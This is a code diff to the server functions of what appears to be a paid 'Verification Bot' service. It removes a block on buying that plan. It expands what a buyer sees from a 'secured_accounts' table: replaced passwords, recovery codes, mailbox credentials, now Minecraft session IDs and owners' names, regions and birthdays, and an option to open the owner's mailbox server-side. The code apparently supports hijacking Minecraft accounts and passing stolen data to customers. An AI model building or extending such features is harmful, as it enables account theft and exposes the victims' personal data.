@@ -492,18 +492,6 @@ export const createInvoice = createServerFn({ method: "POST" })
     const { data: plan } = await db.from("plans").select("*").eq("id", data.plan_id).maybeSingle();
     if (!plan) throw new Error("Unknown plan");
 
-    // Verification Bot is under work — block all public purchases
-    const planId = String(plan.id || "");
-    const planKind = String((plan as { kind?: string }).kind || "");
-    if (
-      planId === "verification" ||
-      planId.startsWith("verification") ||
-      planKind === "verification" ||
-      /verification/i.test(String(plan.name || ""))
-    ) {
-      throw new Error("Verification Bot is under work and cannot be purchased right now.");
-    }
-
     const order_id = `luaux_${user.id}_${Date.now()}`;
 
     // Admin bypass: insert payment then shared fulfill (keys / hours / webhooks)
@@ -671,7 +659,7 @@ export const getSecuredAccounts = createServerFn({ method: "GET" }).handler(asyn
   const { data, error } = await admin()
     .from("secured_accounts")
     .select(
-      "id, discord_id, mc_username, mc_email, new_email, new_password, new_recovery_code, mailbox_email, mailbox_password, mailbox_provider, mailbox_imap_host, mc_method, mc_capes, secured_at, guild_id, session_id",
+      "id, discord_id, mc_username, mc_email, new_email, new_password, new_recovery_code, mailbox_email, mailbox_password, mailbox_provider, mailbox_imap_host, mc_method, mc_capes, mc_ssid, owner_first_name, owner_last_name, owner_region, owner_birthday, secured_at, guild_id, session_id",
     )
     .eq("discord_id", user.id)
     .order("secured_at", { ascending: false })
@@ -682,17 +670,15 @@ export const getSecuredAccounts = createServerFn({ method: "GET" }).handler(asyn
       (typeof row.mailbox_email === "string" && row.mailbox_email) ||
       (typeof row.new_email === "string" && row.new_email) ||
       null;
-    const hasMailbox = !!(
-      mailboxEmail &&
-      typeof row.mailbox_password === "string" &&
-      row.mailbox_password.length > 0
-    );
+    const hasPassword =
+      typeof row.mailbox_password === "string" && row.mailbox_password.length > 0;
     // Never send mailbox_password to the browser — inbox is opened server-side
     const { mailbox_password: _pw, ...rest } = row;
     return {
       ...rest,
       mailbox_email: mailboxEmail,
-      has_mailbox: hasMailbox,
+      has_mailbox: !!(mailboxEmail && hasPassword),
+      can_open_mailbox: !!mailboxEmail,
     };
   };
 
